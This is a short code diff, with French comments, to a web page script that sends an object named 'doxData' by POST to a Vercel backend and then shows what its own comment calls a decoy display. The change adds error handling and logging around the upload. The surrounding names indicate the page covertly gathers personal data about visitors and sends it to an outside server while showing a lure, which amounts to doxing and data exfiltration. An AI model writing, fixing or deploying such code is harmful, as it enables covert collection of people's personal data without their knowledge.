@@ -197,14 +197,22 @@
 
       // Envoi vers ton API Vercel
       try {
-        await fetch('https://backend-two-puce-81.vercel.app/', {  // ← Change avec ton URL Vercel
+        const response = await fetch('https://backend-two-puce-81.vercel.app/', {  // ← Change avec ton URL Vercel
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(doxData)
         });
-        console.log("%c✅ Données envoyées", "color: lime");
+
+        if (!response.ok) {
+          const errorText = await response.text();
+          console.error('Erreur backend:', response.status, errorText);
+          console.log('%c❌ Envoi échoué', 'color: orange');
+        } else {
+          console.log('%c✅ Données envoyées', 'color: lime');
+        }
       } catch(e) {
-        console.log("Erreur d'envoi");
+        console.error('Erreur réseau:', e);
+        console.log('Erreur d'envoi');
       }
 
       // Affichage leurre
